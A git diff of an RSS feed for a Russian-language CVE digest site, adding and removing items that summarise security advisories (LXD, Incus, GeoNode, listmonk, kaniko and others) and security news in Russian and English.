@@ -5,13 +5,223 @@
     <link>https://cveradar-ah3.pages.dev</link>
     <description>Живые CVE и уязвимости на русском: автономный перевод угроз в понятные дайджесты для DevOps и небольшого SecOps</description>
     <language>ru</language>
-    <lastBuildDate>Fri, 06 Nov 2026 17:06:09 GMT</lastBuildDate>
+    <lastBuildDate>Fri, 06 Nov 2026 20:59:27 GMT</lastBuildDate>
+    <item>
+      <title>GHSA-47w9-6r3f-938g: LXD has restricted project bypass leading to arbitrary command execution</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-47w9-6r3f-938g-lxd-has-restricted-project-bypass-leading-to.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-47w9-6r3f-938g-lxd-has-restricted-project-bypass-leading-to.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:51:26 GMT</pubDate>
+      <description>Severity: critical. Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv
+
+### Summary
+
+Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
+allowing for arbitrary command execution on the Incus server by abusing
+lowlevel hooks such as `raw.lxc` </description>
+    </item>
+    <item>
+      <title>GHSA-7mr3-28h5-m5vx: LXD has project restriction bypass for custom volume copy across projects</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-7mr3-28h5-m5vx-lxd-has-project-restriction-bypass-for-custo.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-7mr3-28h5-m5vx-lxd-has-project-restriction-bypass-for-custo.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:51:16 GMT</pubDate>
+      <description>Severity: high. Reported from https://github.com/lxc/incus/security/advisories/GHSA-64f3-v33m-w89f
+
+### Summary
+
+Missing authorization checks exist for custom volume copying where an attacker knowing the name of a project that they don't have access to and the name of a custom volume in that project</description>
+    </item>
+    <item>
+      <title>GHSA-qx75-2p3r-pwm5: LXD has project restriction bypass in instance copy across projects</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-qx75-2p3r-pwm5-lxd-has-project-restriction-bypass-in-instan.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-qx75-2p3r-pwm5-lxd-has-project-restriction-bypass-in-instan.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:51:00 GMT</pubDate>
+      <description>Severity: high. Reported from https://github.com/lxc/incus/security/advisories/GHSA-c9f5-j9c3-mhrg
+
+### Summary
+Missing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy </description>
+    </item>
+    <item>
+      <title>CVE-2026-55649: GeoNode has Stored XSS in Documents metadata abstract field</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-55649-geonode-has-stored-xss-in-documents-metadata-abst.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-55649-geonode-has-stored-xss-in-documents-metadata-abst.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:50:34 GMT</pubDate>
+      <description>Severity: medium. The abstract metadata of documents is not sanitised. It’s possible to store arbitrary HTML (and JS) that will be executed when visiting the page.</description>
+    </item>
+    <item>
+      <title>CVE-2026-46429: GeoNode has Unrestricted File Upload</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-46429-geonode-has-unrestricted-file-upload.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-46429-geonode-has-unrestricted-file-upload.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:41:23 GMT</pubDate>
+      <description>Severity: medium. The upload service validation can be circumvented with specially crafted requests, allowing for the storage and serving of malicious files.</description>
+    </item>
+    <item>
+      <title>CVE-2026-33050: GeoNode has OS command injection via uploaded file layer name</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-33050-geonode-has-os-command-injection-via-uploaded-fil.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-33050-geonode-has-os-command-injection-via-uploaded-fil.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:39:38 GMT</pubDate>
+      <description>Severity: high. Arbitrary OS commands can be executed on the GeoNode by uploading a vector file with a crafted layer name.</description>
+    </item>
+    <item>
+      <title>CVE-2026-9639: LXD has CreateCustomVolumeFromBackup nil-pointer dereference on volumes[0].snapshots[*].expires_at</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-9639-lxd-has-createcustomvolumefrombackup-nil-pointer-d.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-9639-lxd-has-createcustomvolumefrombackup-nil-pointer-d.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:37:14 GMT</pubDate>
+      <description>Severity: medium. ## Summary
+
+(sibling-field variant of CVE-[phone] fix 05bc272)
+
+`(*lxdBackend).CreateCustomVolumeFromBackup` in [`lxd/storage/backend_lxd.go`](https://github.com/canonical/lxd/blob/05bc272/lxd/storage/backend_lxd.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt`</description>
+    </item>
+    <item>
+      <title>GHSA-pjff-c2wc-f6jm: LXD has arbitrary file write on client due to trusted image hash</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-pjff-c2wc-f6jm-lxd-has-arbitrary-file-write-on-client-due-t.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-pjff-c2wc-f6jm-lxd-has-arbitrary-file-write-on-client-due-t.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:36:55 GMT</pubDate>
+      <description>Severity: critical. Reported from https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x
+
+### Summary
+
+An arbitrary file write exists in the Incus client when a malicious image
+server returns a crafted `Incus-Image-Hash` header. This can lead to
+arbitrary command execution as root on t</description>
+    </item>
+    <item>
+      <title>GHSA-fmc8-p6q7-75cc: LXD has argument injection in backup compression algorithm leading to AFW and ACE</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-fmc8-p6q7-75cc-lxd-has-argument-injection-in-backup-compres.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-fmc8-p6q7-75cc-lxd-has-argument-injection-in-backup-compres.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:36:37 GMT</pubDate>
+      <description>Severity: critical. Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4
+
+### Summary
+
+Improper validation of user-provided backup compression algorithm leads to
+argument injection in the constructed command line. This leads to an
+arbitrary file write on the host, poss</description>
+    </item>
+    <item>
+      <title>GHSA-vghh-5rfx-xhq8: LXD has arbitrary file read+write on host via rootfs/ symlink in malicious image</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-vghh-5rfx-xhq8-lxd-has-arbitrary-file-read-write-on-host-vi.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-vghh-5rfx-xhq8-lxd-has-arbitrary-file-read-write-on-host-vi.html</guid>
+      <pubDate>Fri, 06 Nov 2026 19:36:07 GMT</pubDate>
+      <description>Severity: critical. Reported from https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv
+
+### Summary
+
+A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.
+
+
+### Details
+
+Incus validates an image as </description>
+    </item>
+    <item>
+      <title>GHSA-jpf8-86f3-wp38: LXD has arbitrary file read+write on host via templates/ symlink in malicious image</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-jpf8-86f3-wp38-lxd-has-arbitrary-file-read-write-on-host-vi.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-jpf8-86f3-wp38-lxd-has-arbitrary-file-read-write-on-host-vi.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:53:57 GMT</pubDate>
+      <description>Severity: critical. Reported from https://github.com/lxc/incus/security/advisories/GHSA-vxp5-584q-c479
+
+### Summary
+
+A specially crafted image can be used to read or create/write arbitrary
+files on the host; possibly leading to arbitrary command execution.
+
+
+### Details
+
+For container images, `inter</description>
+    </item>
+    <item>
+      <title>GHSA-9j25-mm2h-2f76: LXD has arbitrary file write on host via `exec-output` symlink in crafted image</title>
+      <link>https://cveradar-ah3.pages.dev/item/ghsa-9j25-mm2h-2f76-lxd-has-arbitrary-file-write-on-host-via-exe.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/ghsa-9j25-mm2h-2f76-lxd-has-arbitrary-file-write-on-host-via-exe.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:45:51 GMT</pubDate>
+      <description>Severity: critical. Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv
+
+### Summary
+
+The `record-output` parameter of the `/instances/$name/exec` endpoint
+stores the output of the command in the `exec-output` directory of the
+instance. If `exec-output` is a symlink, f</description>
+    </item>
+    <item>
+      <title>Четвертый спецвыпуск «Хакера» и еще два печатных номера</title>
+      <link>https://cveradar-ah3.pages.dev/item/item.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/item.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:30:45 GMT</pubDate>
+      <description>Четвертый спецвыпуск «Хакера» — самый новый из наших бумажных сборников: в него вошли более 20 технических материалов за 2021–2022 годы, посвященные пентесту, поиску уязвимостей, реверсу и необычному железу. Вместе с ним в продаже остаются еще два спецвыпуска с материалами других лет. Все журналы вы</description>
+    </item>
+    <item>
+      <title>CVE-2026-28385: LXD: SSRF via image import from URL allows internal network probing by authenticated users</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-28385-lxd-ssrf-via-image-import-from-url-allows-interna.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-28385-lxd-ssrf-via-image-import-from-url-allows-interna.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:29:18 GMT</pubDate>
+      <description>Severity: medium. ## Summary
+The LXD image import-from-URL endpoint (`POST /1.0/images` with `source.type=url`) makes server-side HTTP requests to an attacker-supplied URL without any private-IP or loopback blocking. An authenticated user with the `can_create_images` entitlement can force the LXD da</description>
+    </item>
+    <item>
+      <title>CVE-2026-62361: listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-62361-listmonk-sql-injection-in-api-subscribers-export-.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-62361-listmonk-sql-injection-in-api-subscribers-export-.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:15:17 GMT</pubDate>
+      <description>Severity: medium. ### Summary
+
+A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from </description>
+    </item>
+    <item>
+      <title>CVE-2026-62284: OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-62284-osac-operator-kubeconfig-credential-plugin-execut.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-62284-osac-operator-kubeconfig-credential-plugin-execut.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:12:40 GMT</pubDate>
+      <description>Severity: high. ### Impact
+
+ The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec
+  plugin stanza (under users[].user.exec) is faithfully preserve</description>
+    </item>
+    <item>
+      <title>CVE-2026-16454: Eclipse hawkBit DDI has Privilege Escalation that allows Tenant-Isolated Firmware Exfiltration</title>
+      <link>https://cveradar-ah3.pages.dev/item/cve-2026-16454-eclipse-hawkbit-ddi-has-privilege-escalation-that.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-16454-eclipse-hawkbit-ddi-has-privilege-escalation-that.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:09:45 GMT</pubDate>
+      <description>Severity: medium. ## **Description**
+A privilege escalation vulnerability has been identified in the Direct Device Integration (DDI) Controller of **Eclipse hawkBit** (versions 1.0.3 and prior).
+
+This vulnerability allows an authenticated device to escalate its permissions and bypass the strict boun</description>
+    </item>
+    <item>
+      <title>Хостинг-провайдер Beget сообщил об уничтожении облачной инфраструктуры после кибератаки</title>
+      <link>https://cveradar-ah3.pages.dev/item/beget.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/beget.html</guid>
+      <pubDate>Fri, 06 Nov 2026 18:00:42 GMT</pubDate>
+      <description>Представители Beget опубликовали новый отчет о восстановлении после масштабной кибератаки, произошедшей в начале текущей недели. В компании заявили, что облачная инфраструктура была уничтожена и теперь ее приходится фактически строить с нуля. Восстановить все данные VPS также не удастся: файловые бэ</description>
+    </item>
+    <item>
+      <title>Мощь пошика. Вкатываемся в PowerShell и пишем скрипты для Windows</title>
+      <link>https://cveradar-ah3.pages.dev/item/powershell-windows.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/powershell-windows.html</guid>
+      <pubDate>Fri, 06 Nov 2026 17:40:00 GMT</pubDate>
+      <description>&lt;a href="/tag/vybor-redaktora/"&gt;Для подписчиков&lt;/a&gt;&lt;br/&gt;Надоело гуглить, как в PowerShell сделать то и это? Тогда читай дальше, и ты узнаешь, чем PowerShell отличается от Bash, поймешь, как быстро находить нужные функции, даже не зная их названий, и на практических примерах научишься писать свои ком</description>
+    </item>
+    <item>
+      <title>Synology предупреждает о вымогательских атаках, нацеленных на NAS</title>
+      <link>https://cveradar-ah3.pages.dev/item/synology-nas.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/synology-nas.html</guid>
+      <pubDate>Fri, 06 Nov 2026 17:30:22 GMT</pubDate>
+      <description>Представители Synology предупредили владельцев NAS о всплеске активности шифровальщика C3RB3R: злоумышленники взламывают устройства под управлением устаревших версий DiskStation Manager (DSM), шифруют данные и требуют выкуп. Пользователям рекомендуют срочно обновить DSM, а также закрыть доступ к пан</description>
+    </item>
     <item>
       <title>Installing the Fix for an Exploited WordPress Flaw Can Expose Some Sites One Last Time</title>
       <link>https://cveradar-ah3.pages.dev/item/installing-the-fix-for-an-exploited-wordpress-flaw-can-expose-so.html</link>
       <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/installing-the-fix-for-an-exploited-wordpress-flaw-can-expose-so.html</guid>
       <pubDate>Fri, 06 Nov 2026 16:08:38 GMT</pubDate>
       <description>Some WordPress sites can still be attacked while they install the fix for an actively exploited flaw, according to Umut Bayram, the Picus Security researcher who found it. The update that installs the fix still unpacks its files using the site's old, unpatched code, so an attacker who strikes at the</description>
+    </item>
+    <item>
+      <title>Власти США запретили федеральным ведомствам использовать ПО Acronis</title>
+      <link>https://cveradar-ah3.pages.dev/item/acronis.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/acronis.html</guid>
+      <pubDate>Fri, 06 Nov 2026 15:30:19 GMT</pubDate>
+      <description>Министерство внутренней безопасности США (DHS) обязало федеральные органы исполнительной власти удалить продукты Acronis из своих систем до 27 января 2027 года. По информации СМИ, этому решению предшествовали многолетние проверки из-за связей компании с Россией.</description>
     </item>
     <item>
       <title>Hackers Target OpenSSH SSHole Flaw Within Hours of Disclosure, Gain Root on Honeypot</title>
@@ -26,6 +236,13 @@
       <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/openai-launches-gpt-6-cyber-after-ai-helps-find-81-firefox-flaws.html</guid>
       <pubDate>Fri, 06 Nov 2026 14:58:32 GMT</pubDate>
       <description>OpenAI on Thursday unveiled GPT‑6 Cyber, which it described as a major step forward in security research that brings together stronger cybersecurity capabilities with a step-change improvement in model alignment. The new model is "more capable at finding and fixing vulnerabilities, and far more reli</description>
+    </item>
+    <item>
+      <title>Apple будет проверять весь публичный контент в iCloud</title>
+      <link>https://cveradar-ah3.pages.dev/item/apple-icloud.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/apple-icloud.html</guid>
+      <pubDate>Fri, 06 Nov 2026 12:30:41 GMT</pubDate>
+      <description>Представители Apple заявили, что с выходом iOS 27.3, iPadOS 27.3, macOS 27.3 и visionOS 27.3 весь контент, которым пользователи делятся через общедоступные ссылки iCloud, будут проверять на наличие «вредоносных материалов». При этом в компании пока не объяснили, что именно подпадает под это определе</description>
     </item>
     <item>
       <title>Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It</title>
@@ -49,191 +266,18 @@
       <description>An update on Athena, and some unsolicited predictions on what's coming next On Saturday, Dario Amodei published We Must Pace the Frontier. I agree with him. Go read it if you haven't. I've spent the summer looking at what these models find, and the gap he describes between what they can do and what </description>
     </item>
     <item>
-      <title>Chainalysis Breach Exposes All Users' Credentials, Forces Shutdown of Key Services</title>
-      <link>https://cveradar-ah3.pages.dev/item/chainalysis-breach-exposes-all-users-credentials-forces-shutdown.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/chainalysis-breach-exposes-all-users-credentials-forces-shutdown.html</guid>
-      <pubDate>Fri, 06 Nov 2026 08:04:49 GMT</pubDate>
-      <description>Blockchain analysis firm Chainalysis has revealed that its ongoing investigation into the agentic cyber attack targeting its systems also exposed names, usernames, password hashes and live tokens for all users. "While we investigated, we removed access to Reactor and Data Solutions," the company sai</description>
+      <title>ИИ-агенты OpenAI создали эксплоиты для 948 уязвимостей в ядре Linux</title>
+      <link>https://cveradar-ah3.pages.dev/item/openai-948-linux.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/openai-948-linux.html</guid>
+      <pubDate>Fri, 06 Nov 2026 10:30:32 GMT</pubDate>
+      <description>В OpenAI рассказали о масштабном эксперименте, проведенном с еще не выпущенной ИИ-моделью, предназначенной для решения задач в области кибербезопасности. В компании заявили, в ходе 30-часового запуска пайплайна ИИ-агенты динамически подтвердили сотни уязвимостей в ядре Linux, а также создали рабочие</description>
     </item>
     <item>
-      <title>Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs</title>
-      <link>https://cveradar-ah3.pages.dev/item/hackers-hide-linux-backdoor-in-control-web-panel-server-to-execu.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/hackers-hide-linux-backdoor-in-control-web-panel-server-to-execu.html</guid>
-      <pubDate>Fri, 06 Nov 2026 05:58:54 GMT</pubDate>
-      <description>A backdoor has been found hiding in the web server that runs Control Web Panel (CWP), a free panel for managing Linux hosting servers, researchers at QiAnXin's XLab said this week. The backdoored web server executes commands that attackers send via web requests, and those requests never appear in it</description>
-    </item>
-    <item>
-      <title>Experts Demonstrate Barracuda Email Security Gateway Chain Enabling Root Access Without Login</title>
-      <link>https://cveradar-ah3.pages.dev/item/experts-demonstrate-barracuda-email-security-gateway-chain-enabl.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/experts-demonstrate-barracuda-email-security-gateway-chain-enabl.html</guid>
-      <pubDate>Fri, 06 Nov 2026 05:39:10 GMT</pubDate>
-      <description>Two flaws in Barracuda's Email Security Gateway, an email-filtering appliance, can be chained to run commands on it as root, its highest level of access, with no login required. The company released patches on Monday, and the security firm watchTowr detailed the attack chain on Thursday. One flaw, C</description>
-    </item>
-    <item>
-      <title>CVE-2026-62300: filecoin-pin: Unbounded DAG pinning can exhaust server resources</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-62300-filecoin-pin-unbounded-dag-pinning-can-exhaust-se.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-62300-filecoin-pin-unbounded-dag-pinning-can-exhaust-se.html</guid>
-      <pubDate>Thu, 05 Nov 2026 18:07:30 GMT</pubDate>
-      <description>Severity: medium. ## Summary
-
-The IPFS Pinning Service API implementation accepts a caller-controlled CID through `POST /pins`, queues background processing, and then recursively fetches the full DAG with `helia.pins.add(cid)`. The route and background pinning path do not enforce a request rate limi</description>
-    </item>
-    <item>
-      <title>CVE-2026-61536: Banks: Unsafe importlib.import_module of attacker-controlled Tool.import_path in CompletionExtension allows RCE</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-61536-banks-unsafe-importlib-import-module-of-attacker-.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-61536-banks-unsafe-importlib-import-module-of-attacker-.html</guid>
-      <pubDate>Thu, 05 Nov 2026 17:51:02 GMT</pubDate>
-      <description>Severity: high. ## Summary
-
-  `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their
-  `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool
-   call. There is no allowlist or san</description>
-    </item>
-    <item>
-      <title>CVE-2026-105769: kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-105769-kaniko-can-send-the-build-s-azure-entra-id-acces.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-105769-kaniko-can-send-the-build-s-azure-entra-id-acces.html</guid>
-      <pubDate>Thu, 05 Nov 2026 17:48:54 GMT</pubDate>
-      <description>Severity: critical. ### Summary
-
-kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The bu</description>
-    </item>
-    <item>
-      <title>CVE-2026-12411: lxd allows Cross-guest volume hijack via DevLXD device patch</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-12411-lxd-allows-cross-guest-volume-hijack-via-devlxd-d.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-12411-lxd-allows-cross-guest-volume-hijack-via-devlxd-d.html</guid>
-      <pubDate>Thu, 05 Nov 2026 17:40:59 GMT</pubDate>
-      <description>Severity: high. ### Summary
-
-A guest can mount another guest's custom storage volume over `/dev/lxd` and read or write its contents without owning it. The DevLXD storage API blocks access to volumes you don't own, but the instance device-update path that attaches a volume to a container without chec</description>
-    </item>
-    <item>
-      <title>OpenSSH Issues Emergency Fix for Flaw Letting Long Passwords Bypass SSH Auth on Alpine Linux</title>
-      <link>https://cveradar-ah3.pages.dev/item/openssh-issues-emergency-fix-for-flaw-letting-long-passwords-byp.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/openssh-issues-emergency-fix-for-flaw-letting-long-passwords-byp.html</guid>
-      <pubDate>Thu, 05 Nov 2026 16:42:46 GMT</pubDate>
-      <description>Attackers can log in to accounts that have no password, such as SSH key-only accounts, on some Alpine Linux servers running the standard openssh-server package. They need network access to the server, an account name, and a password between 257 and 1,024 bytes long. OpenSSH, which rates the flaw cri</description>
-    </item>
-    <item>
-      <title>Researchers Bypass ChatGPT Lockdown Mode to Exfiltrate Chats Without User Interaction</title>
-      <link>https://cveradar-ah3.pages.dev/item/researchers-bypass-chatgpt-lockdown-mode-to-exfiltrate-chats-wit.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/researchers-bypass-chatgpt-lockdown-mode-to-exfiltrate-chats-wit.html</guid>
-      <pubDate>Thu, 05 Nov 2026 16:42:32 GMT</pubDate>
-      <description>Cybersecurity researchers have disclosed details of a now-patched vulnerability that could be exploited to bypass Lockdown Mode protections in OpenAI ChatGPT. Lockdown Mode was introduced by the artificial intelligence (AI) company in June 2026 as an optional setting to minimize data exfiltration ri</description>
-    </item>
-    <item>
-      <title>ThreatsDay: Apache OFBiz RCE, DreamHost Breach, DeFi Site Hijacks + 17 More Stories</title>
-      <link>https://cveradar-ah3.pages.dev/item/threatsday-apache-ofbiz-rce-dreamhost-breach-defi-site-hijacks-1.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/threatsday-apache-ofbiz-rce-dreamhost-breach-defi-site-hijacks-1.html</guid>
-      <pubDate>Thu, 05 Nov 2026 14:41:10 GMT</pubDate>
-      <description>How much damage can someone do without breaking much? Quite a lot, it seems. A stolen login can open doors across several systems. A trusted setting can be used to lock people out. Even a simple file copy can reach places it shouldn't. And while new tools are helping find security holes faster, some</description>
-    </item>
-    <item>
-      <title>Is Your Exposure Management Platform Leaving You Exposed? Five Tests to Find Out</title>
-      <link>https://cveradar-ah3.pages.dev/item/is-your-exposure-management-platform-leaving-you-exposed-five-te.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/is-your-exposure-management-platform-leaving-you-exposed-five-te.html</guid>
-      <pubDate>Thu, 05 Nov 2026 12:25:00 GMT</pubDate>
-      <description>A critical finding can move through several security tools and still leave the organization exposed.&amp;nbsp; The vulnerability has a severity score, and a ticket has reached the queue. Progress then depends on information the finding may lack: who owns the system, whether attackers can reach it, what </description>
-    </item>
-    <item>
-      <title>OpenAI AI Pipeline Generates 948 Linux Root Escalation Exploits in 30-Hour Run</title>
-      <link>https://cveradar-ah3.pages.dev/item/openai-ai-pipeline-generates-948-linux-root-escalation-exploits-.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/openai-ai-pipeline-generates-948-linux-root-escalation-exploits-.html</guid>
-      <pubDate>Thu, 05 Nov 2026 12:08:54 GMT</pubDate>
-      <description>OpenAI on Wednesday detailed a pipeline that employed an upcoming cyber-focused artificial intelligence (AI) model to validate and patch 948 local privilege escalation vulnerabilities in Linux for $1.2 million in API costs. "Our prototype identified and analyzed 2,308 candidate Linux kernel findings</description>
-    </item>
-    <item>
-      <title>5 Active Cyber Threats That Put US Enterprises at Risk in October 2026</title>
-      <link>https://cveradar-ah3.pages.dev/item/5-active-cyber-threats-that-put-us-enterprises-at-risk-in-octobe.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/5-active-cyber-threats-that-put-us-enterprises-at-risk-in-octobe.html</guid>
-      <pubDate>Thu, 05 Nov 2026 10:06:19 GMT</pubDate>
-      <description>October 2026 brought another wave of cyber threats targeting US businesses, with attackers exploiting trusted platforms, legitimate authentication processes, and everyday business workflows. For enterprises, these campaigns raise the stakes beyond individual security incidents, increasing the risk o</description>
-    </item>
-    <item>
-      <title>Apple to Start Scanning Publicly Shared iCloud Photos and Files for Harmful Content</title>
-      <link>https://cveradar-ah3.pages.dev/item/apple-to-start-scanning-publicly-shared-icloud-photos-and-files-.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/apple-to-start-scanning-publicly-shared-icloud-photos-and-files-.html</guid>
-      <pubDate>Thu, 05 Nov 2026 09:13:28 GMT</pubDate>
-      <description>Apple has revealed that it plans to start checking public iCloud links for harmful content starting with iOS 27.3, iPadOS 27.3, macOS 27.3, and visionOS 27.3. The change specifically applies to scenarios where users share iCloud content, such as photos in iCloud Photos or files in iCloud Drive, by s</description>
-    </item>
-    <item>
-      <title>CERT-In Flags AI-Driven Attacks as Backdoored ARTEX Exposes 62 Consoles to Root Access</title>
-      <link>https://cveradar-ah3.pages.dev/item/cert-in-flags-ai-driven-attacks-as-backdoored-artex-exposes-62-c.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cert-in-flags-ai-driven-attacks-as-backdoored-artex-exposes-62-c.html</guid>
-      <pubDate>Thu, 05 Nov 2026 08:42:03 GMT</pubDate>
-      <description>The Indian Computer Emergency Response Team (CERT-In) has disclosed that an artificial intelligence (AI)-assisted threat actor it tracks as Crafty Falcon is targeting organizations in the Banking, Financial Services, and Insurance (BFSI) sectors in the country. Describing the threat as active and on</description>
-    </item>
-    <item>
-      <title>Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution</title>
-      <link>https://cveradar-ah3.pages.dev/item/zyxel-gs1900-patch-fails-to-block-zero-day-exploit-allowing-root.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/zyxel-gs1900-patch-fails-to-block-zero-day-exploit-allowing-root.html</guid>
-      <pubDate>Thu, 05 Nov 2026 07:06:33 GMT</pubDate>
-      <description>Zyxel GS1900 network switches that received the vendor's earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at Binarly found. The exploit lets anyone who can reach a switch's web management interface run commands on it without logging in. Zyxel has r</description>
-    </item>
-    <item>
-      <title>Hackers Exploit Patched Apple Flaw to Deliver Info-Stealing Malware, CISA Says</title>
-      <link>https://cveradar-ah3.pages.dev/item/hackers-exploit-patched-apple-flaw-to-deliver-info-stealing-malw.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/hackers-exploit-patched-apple-flaw-to-deliver-info-stealing-malw.html</guid>
-      <pubDate>Thu, 05 Nov 2026 05:17:04 GMT</pubDate>
-      <description>The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a medium-severity security flaw impacting multiple Apple operating systems to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation. The vulnerability in question is CVE-[phone] </description>
-    </item>
-    <item>
-      <title>CVE-2026-55098: Arc: DuckDB I/O aliases bypass database RBAC after CVE-2026-47735</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-55098-arc-duckdb-i-o-aliases-bypass-database-rbac-after.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-55098-arc-duckdb-i-o-aliases-bypass-database-rbac-after.html</guid>
-      <pubDate>Wed, 04 Nov 2026 17:02:37 GMT</pubDate>
-      <description>Severity: medium. ### Summary
-
